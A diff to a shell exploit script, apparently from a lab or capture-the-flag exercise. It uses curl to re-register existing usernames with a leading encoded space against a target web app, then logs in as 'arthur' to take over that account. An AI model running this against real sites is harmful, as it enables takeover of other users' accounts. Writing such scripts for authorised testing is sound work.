@@ -19,8 +19,14 @@ echo "--> Session initiated : $PHPSESSID"
 
 # Registering darren a second time
 echo "2 - REGISTERING DARREN"
-curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user=%20darren" -F "email=darren@gmail.com" -F "pass=test" -F "submit=Register" -v
+curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user=%20darren" -F "email=darren@gmail.com" -F "pass=test" -F "submit=Register" 2>/dev/null
 
 # Registering arthur a second time
-echo "3 - REGISTERING ARTHUR"
-curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user=%20arthur" -F "email=arthur@gmail.com" -F "pass=test" -F "submit=Register" -v
+echo "4 - REGISTERING ARTHUR"
+curl -s -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -L -F "user=%20arthur" -F "email=arthur@gmail.com" -F "pass=test" -F "submit=Register" 2>/dev/null
+
+
+# Logging as arthur
+echo "5 - ANALYZING ARTHURR"
+curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=%20arthur" -d "pass=test" -v
+
